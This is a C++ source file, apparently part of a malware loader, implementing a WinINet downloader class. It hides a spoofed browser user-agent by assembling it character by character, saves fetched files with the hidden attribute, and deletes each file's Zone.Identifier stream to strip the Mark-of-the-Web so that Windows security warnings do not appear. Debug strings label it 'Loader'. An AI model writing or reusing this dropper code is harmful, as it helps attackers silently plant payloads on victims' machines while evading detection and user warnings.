#include "global.h"

Downloader::Downloader()
{

	WCHAR szUserAgent[] =
	{
		L'M', L'o', L'z', L'i', L'l', L'l', L'a',
		L'/', L'5', L'.', L'0', L' ', L'(', L'W', L'i',
		L'n', L'd', L'o', L'w', L's', L' ', L'N',
		L'T', L' ', L'6', L'.', L'1', L';', L' ',
		L'W', L'O', L'W', L'6', L'4', L')', L' ',
		L'A', L'p', L'p', L'l', L'e', L'W', L'e',
		L'b', L'K', L'i', L't', L'/', L'5', L'3',
		L'7', L'.', L'3', L'6', L' ', L'(', L'K',
		L'H', L'T', L'M', L'L', L',', L' ', L'l', L'i',
		L'k', L'e', L' ', L'G', L'e', L'c', L'k',
		L'o', L')', L' ', L'C', L'h', L'r', L'o',
		L'm', L'e', L'/', L'5', L'5', L'.', L'0',
		L'.', L'2', L'8', L'8', L'3', L'.', L'8',
		L'7', L' ', L'S', L'a', L'f', L'a', L'r',
		L'i', L'/', L'5', L'3', L'7', L'.', L'3',
		L'6', L'\0'
	};


	this->hInternet = InternetOpenW(szUserAgent, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);

	if (!this->hInternet)
	{
		dbg("Loader http warn: Can not retrieve INTERNET handle with OPEN_TYPE_DIRECT");
		dbg("Loader http info: trying to use preconfigured proxy server");

		this->hInternet = InternetOpenW(L"Mozilla", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, INTERNET_FLAG_ASYNC);
		if (!this->hInternet)
		{
			dbg("Loader http error: Error: can not retrieve INTERNET handle");
		}
	}
}

Downloader::~Downloader()
{
	if (this->hInternet)
	{
		InternetCloseHandle(this->hInternet);
	}
	else
		dbg("Loader warn: internet was not initialized. Nothing to free");
}

BOOL Downloader::save(LPWSTR from, LPWSTR to)
{
	if (!this->hInternet)
	{
		dbg("Loader error: can not download file because of internet unitialized");
		return FALSE;
	}
	
	INT Tries = 0;
	BOOL ret = TRUE;
	do
	{
		this->hFile = InternetOpenUrlW(this->hInternet, from, 0, 0, INTERNET_FLAG_NO_CACHE_WRITE, 0);
		Tries++;
	} while ((Tries != 5) && (!this->hFile));

	if ((Tries == 5) && (!this->hFile))
	{
		dbg("Loader error: max connection tries reached. Can not retrieve url: ");
		dbg(from);
		return FALSE;
	}

	GlobalMemory MyMem(1025);
	LPVOID pData = MyMem.localloc(1024);
	DWORD dwRead;

	Tries = 0;

	HANDLE hLocal = CreateFileW(to, GENERIC_WRITE, FILE_SHARE_READ, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, 0);

	if (hLocal != INVALID_HANDLE_VALUE)
	{
		DWORD dwWritten;
		while (InternetReadFile(this->hFile, pData, 1024, &dwRead) == TRUE)
		{
			if (!dwRead)
				break;

			if (!WriteFile(hLocal, pData, dwRead, &dwWritten, 0))
			{
				dbg("Loader error: can not write in file");
				dbg(to);
			}

			Tries++;
		}
		if ((!Tries) && (dwRead == 0))
		{
			dbg("Loader error: error reading file");
			ret = FALSE;
		}

		CloseHandle(hLocal);

		GlobalMemory ntfs(600);
		LPWSTR ZoneIdentifier = (LPWSTR)ntfs.localloc(598);
		wsprintfW(ZoneIdentifier, L"%s:Zone.Identifier", to);
		DeleteFileW(ZoneIdentifier);


	}
	else
	{
		dbg("Can not create file: ");
		dbg(to);
		ret = FALSE;
	}
	InternetCloseHandle(this->hFile);

	return ret;
}